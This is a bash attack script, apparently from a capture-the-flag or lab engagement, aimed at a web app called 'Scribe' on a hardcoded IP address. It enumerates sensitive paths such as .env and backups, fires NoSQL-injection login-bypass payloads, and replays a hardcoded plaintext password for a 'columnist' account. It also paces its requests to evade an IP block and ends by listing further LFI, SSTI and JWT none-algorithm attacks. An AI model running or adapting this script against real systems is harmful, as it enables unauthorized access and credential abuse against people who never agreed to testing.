#!/bin/bash
# Scribe-02 rapid-strike script — fire the moment a Scribe window opens
# (Apache/Scribe revival on :80, or a fresh instance after box reset).
# Usage: scribe_rapid.sh <TARGET_IP>   (default 159.65.140.97)
# Gentle spacing: single curl per request, 1s gaps — NEVER ffuf this box
# (30rps for 4min triggered an all-port IP block on 2026-09-13).
T="${1:-159.65.140.97}"
TS=$(date +%H%M%S)
OUT="/tmp/opencode/scribe_window_$TS"; mkdir -p "$OUT"
C=125   # catch-all body size on the Scribe app (soft-404 marker)

req() { # req <name> <path> [extra curl args...]
  local name="$1"; shift
  local path="$1"; shift
  curl -s -i --max-time 8 "$@" "http://$T$path" > "$OUT/$name.txt" 2>/dev/null
  local len=$(grep -i '^content-length' "$OUT/$name.txt" | tr -dc 0-9 | head -1)
  local code=$(head -1 "$OUT/$name.txt" | tr -dc 0-9 | cut -c1-3)
  if [ -n "$len" ] && [ "$len" != "$C" ]; then
    echo "!!! HIT $path code=$code len=$len → $OUT/$name.txt"
  fi
  sleep 1
}

echo "[*] Window check on $T at $(date +%H:%M:%S)"
req root "/"
req health "/api/health"
if ! grep -q 'scribe' "$OUT/health.txt" 2>/dev/null; then
  echo "[-] /api/health not Scribe — window closed or box changed. Files in $OUT"; exit 1
fi
echo "[+] Scribe ALIVE — running endpoint battery"

# curated /api endpoint list (scribe = documents/notes/search theme)
for ep in status info version config debug docs swagger swagger.json openapi.json \
          v1 v2 users user login logout auth token admin metrics internal \
          notes note entries entry docs doc files file search render template \
          report reports archive export import backup settings env keys \
          upload download ping health/db health/stats registry registers \
          scribbles drafts articles posts pages whoami me session; do
  req "api_$ep" "/api/$ep"
done

# root-level extras
for rp in robots.txt sitemap.xml admin login auth docs api.txt .env \
          server-status backup backups uploads files static public; do
  req "root_$rp" "/$rp"
done

# method behavior on health
req health_post "/api/health" -X POST -H 'Content-Type: application/json' -d '{}'
req health_options "/api/health" -X OPTIONS

# NoSQLi / SSTI / traversal quick probes against discovered endpoints
for f in "$OUT"/api_*.txt; do
  ep=$(basename "$f" | sed 's/^api_//; s/\.txt$//')
  [ -s "$f" ] || continue
  # NoSQL auth bypass pattern on login-like endpoints
  case "$ep" in
    login|auth|signin)
      req "nosqli_$ep" "/api/$ep" -X POST -H 'Content-Type: application/json' \
        -d '{"username":{"$ne":""},"password":{"$ne":""}}'
      req "nosqli2_$ep" "/api/$ep" -X POST -H 'Content-Type: application/json' \
        -d '{"user":{"$gt":""},"pass":{"$gt":""}}'
      ;;
  esac
done

# old-instance creds against any auth-looking endpoint (READ-ONLY probes)
for f in "$OUT"/api_login.txt "$OUT"/api_auth.txt; do
  [ -s "$f" ] || continue
  req "credcol_login" "/api/login" -X POST -H 'Content-Type: application/json' \
    -d '{"username":"columnist","password":"C0lumn1st_scr1b3_2024!"}'
  break
done

echo "[*] Done. Review $OUT — all HIT lines above are real endpoints."
echo "[*] Follow-ups: LFI on ?file=/?page=/?doc= params, SSTI {{7*7}} in any rendered field,"
echo "[*] NoSQLi on login, JWT none-alg on token endpoints, then searchsploit on the stack."
